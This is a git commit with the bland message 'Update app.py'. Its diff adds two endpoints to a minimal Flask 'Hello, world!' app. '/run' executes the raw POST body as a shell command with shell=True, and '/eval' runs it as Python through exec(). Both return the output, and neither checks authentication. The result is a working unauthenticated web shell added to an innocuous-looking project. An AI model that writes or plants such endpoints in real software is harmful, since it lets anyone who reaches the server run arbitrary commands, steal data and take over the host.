b8d62918b21f4b858851ea97e8bacbc55f3b5de9
آفتاب عالم ٭ <103352133+Alone0791@users.noreply.github.com>
2024-02-20 08:43:41 +0530

    Update app.py

--- app.py
+++ app.py
@@ -6,3 +6,27 @@ app = Flask(__name__)
 @app.route('/')
 def hello_world():
     return 'Hello, world!'
+
+@app.route('/run', methods=["POST"])
+def run_code():
+    run = subprocess.run(request.data.decode("utf-8"), shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE, encoding="utf-8")
+    if run.stdout:
+        return run.stdout
+    else:
+        return run.stderr
+
+@app.route('/eval', methods=["POST"])
+def proo():
+   text = request.data.decode("utf-8")
+   if not text:
+      return "lol"
+   file = io.StringIO()
+   sys.stdout = file
+   sys.stderr = file
+   try:
+      exec(text)
+   except Exception:
+      return traceback.format_exc()
+   sys.stdout = sys.__stdout__
+   sys.stderr = sys.__stderr__
+   return file.getvalue()
